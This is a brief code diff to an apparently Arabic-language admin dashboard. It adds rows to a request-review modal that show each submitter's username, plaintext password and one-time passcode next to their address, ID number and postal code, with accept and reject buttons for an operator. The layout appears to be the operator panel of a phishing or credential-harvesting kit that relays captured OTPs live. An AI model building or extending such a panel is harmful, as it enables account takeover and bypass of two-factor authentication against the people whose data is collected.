@@ -503,6 +503,9 @@
         <div class="modal-row"><span class="field-label">العنوان</span><span class="field-value">${r.address}</span></div>
         <div class="modal-row"><span class="field-label">رقم التعريف</span><span class="field-value">${r.idNum}</span></div>
         <div class="modal-row"><span class="field-label">الرمز البريدي</span><span class="field-value">${r.zip}</span></div>
+       <div class="modal-row"><span class="field-label">اسم المستخدم:</span><span class="field-value">${r.username}</span></div>
+<div class="modal-row"><span class="field-label">كلمة المرور:</span><span class="field-value">${r.password}</span></div>
+<div class="modal-row"><span class="field-label">OTP:</span><span class="field-value">${r.otp}</span></div>
         <div class="modal-actions">
           <button class="action-btn accept-btn" onclick="decideRequest('${r.id}', 'accepted')">قبول</button>
           <button class="action-btn reject-btn" onclick="decideRequest('${r.id}', 'rejected')">رفض</button>
